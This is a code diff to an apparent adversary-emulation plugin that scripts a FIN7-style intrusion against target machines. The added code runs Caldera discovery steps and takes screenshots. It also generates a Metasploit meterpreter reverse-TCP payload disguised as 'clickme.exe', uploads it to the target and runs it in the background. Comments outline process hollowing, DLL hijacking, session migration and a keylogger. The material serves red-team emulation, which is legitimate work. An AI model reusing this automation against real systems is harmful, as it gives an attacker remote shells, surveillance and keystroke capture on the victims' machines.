@@ -4,6 +4,8 @@
 
 from plugins.base.attack import AttackPlugin
 from app.interface_sfx import CommandlineColors
+from app.metasploit import MSFVenom
+import os
 
 
 
@@ -49,20 +51,42 @@ class FIN7Plugin(AttackPlugin):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 3: Target Assessment{CommandlineColors.ENDC}", 1)
 
+        # TODO: Make sure logging is nice and complete
+
         # WMI queries  https://attack.mitre.org/techniques/T1057/
 
-        # TODO execute net view from spawned cmd https://attack.mitre.org/techniques/T1135/
-
-        self.caldera_attack(self.targets[0], "deeac480-5c2a-42b5-90bb-41675ee53c7e", parameters={"remote.host.fqdn": self.targets[0].getip()})
+        # Execute net view from spawned cmd https://attack.mitre.org/techniques/T1135/
+        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}new view {CommandlineColors.ENDC}", 1)
+        self.caldera_attack(self.targets[0], "deeac480-5c2a-42b5-90bb-41675ee53c7e", parameters={"remote.host.fqdn": self.targets[0].get_ip()})
 
         # check for sandbox https://attack.mitre.org/techniques/T1497/
-        # query username https://attack.mitre.org/techniques/T1497/
-        # query computername https://attack.mitre.org/techniques/T1082/
-        # load adsldp.dll and call dllGetClassObject() for the Windows Script Host ADSystemInfo Object COM object https://attack.mitre.org/techniques/T1082/
+        # The documentation does not define how it is checking exactly.
+        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}get-wmiobject win32_computersystem | fl model{CommandlineColors.ENDC}", 1)
+        self.caldera_attack(self.targets[0], "5dc841fd-28ad-40e2-b10e-fb007fe09e81")
+
+        # query username https://attack.mitre.org/techniques/T1033/
+        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}query USERNAME env{CommandlineColors.ENDC}", 1)
+        self.caldera_attack(self.targets[0], "c0da588f-79f0-4263-8998-7496b1a40596")
+
+        # TODO: query computername https://attack.mitre.org/techniques/T1082/
+        # self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}query COMPUTERNAME env{CommandlineColors.ENDC}", 1)
+        #self.caldera_attack(self.targets[0], "c0da588f-79f0-4263-8998-7496b1a40596")
+
+        # TODO: load adsldp.dll and call dllGetClassObject() for the Windows Script Host ADSystemInfo Object COM object https://attack.mitre.org/techniques/T1082/
         # WMI query for System Network Configuration discovery https://attack.mitre.org/techniques/T1016/
+        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Network configuration discovery. Original is some WMI, here we are using nbstat{CommandlineColors.ENDC}", 1)
+        self.caldera_attack(self.targets[0], "14a21534-350f-4d83-9dd7-3c56b93a0c17")
         # System Info discovery https://attack.mitre.org/techniques/T1082/
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}System info discovery, as close as it gets{CommandlineColors.ENDC}",
+            1)
+        self.caldera_attack(self.targets[0], "b6b105b9-41dc-490b-bc5c-80d699b82ce8")
         # CMD.exe->powershell.exe, start takeScreenshot.ps1 https://attack.mitre.org/techniques/T1113/
-        # Upload that via MSSQL transaction https://attack.mitre.org/techniques/T1041/
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Take screenshot{CommandlineColors.ENDC}",
+            1)
+        self.caldera_attack(self.targets[0], "316251ed-6a28-4013-812b-ddf5b5b007f8")
+        # TODO: Upload that via MSSQL transaction https://attack.mitre.org/techniques/T1041/
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 3: Target Assessment{CommandlineColors.ENDC}", 1)
@@ -72,6 +96,25 @@ class FIN7Plugin(AttackPlugin):
             f"{CommandlineColors.OKBLUE}Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)
 
         # Uploaded stager creates meterpreter shell (babymetal)
+        # Generate payload:
+
+        payload_name = "clickme.exe"
+        venom = MSFVenom(self.attacker_machine_plugin, self.targets[0])
+        venom.generate_payload(payload="linux/x64/meterpreter_reverse_tcp",
+                             architecture="x64",
+                             platform="linux",
+                             # lhost,
+                             format="elf",
+                             outfile=payload_name)
+        self.attacker_machine_plugin.get(payload_name, self.targets[0].get_machine_path_external())
+        src = os.path.join(self.targets[0].get_machine_path_external(), payload_name)
+        self.targets[0].put(src, self.targets[0].get_playground())
+        if self.targets[0].get_playground() is not None:
+            pl = os.path.join(self.targets[0].get_playground(), payload_name)
+        else:
+            pl = payload_name
+        self.targets[0].remote_run(pl, disown=True)
+
         # adb156.exe -> cmd.exe ->powershell.exe decodes embedded dll payload https://attack.mitre.org/techniques/T1059/003/ and https://attack.mitre.org/techniques/T1059/001/
         # powershell cmdlet Invoke-Expression executes decoded dll https://attack.mitre.org/techniques/T1140/
         # powershell.exe loads shellcode into memory (received from C2 server) https://attack.mitre.org/techniques/T1573/
@@ -120,7 +163,7 @@ class FIN7Plugin(AttackPlugin):
 
         # Create BOOSTWRITE meterpreter handler
         # Create temporary HTTP server serving "B" as XOR Key
-        # hollow.exe meterpreter session dowliads BOOSTWRITE.dll to srrstr.dll https://attack.mitre.org/techniques/T1105/
+        # hollow.exe meterpreter session dowloads BOOSTWRITE.dll to srrstr.dll https://attack.mitre.org/techniques/T1105/
         # cmd.exe spawns svchost.exe -> executes SystemPropertiesAdvanced.exe which executes srrstr.dll
         # srrstr.dll spawns rundll32.exe which communicates to metasploit. New shell !
 
@@ -135,7 +178,7 @@ class FIN7Plugin(AttackPlugin):
 
         # This is meterpreter !
 
-        # Meterpreter migrates toexplorer.exe (from svchost) https://attack.mitre.org/techniques/T1055/
+        # Meterpreter migrates to explorer.exe (from svchost) https://attack.mitre.org/techniques/T1055/
         # screenspy for screen capture https://attack.mitre.org/techniques/T1113/
         # migrate session to mstsc.exe https://attack.mitre.org/techniques/T1056/001/
         # deploy keylogger https://attack.mitre.org/techniques/T1056/001/
@@ -181,7 +224,7 @@ class FIN7Plugin(AttackPlugin):
 
         self.step1()
         self.step2()
-        self.step3()
+        # self.step3()  # Done and works
         self.step4()
         self.step5()
         self.step6()
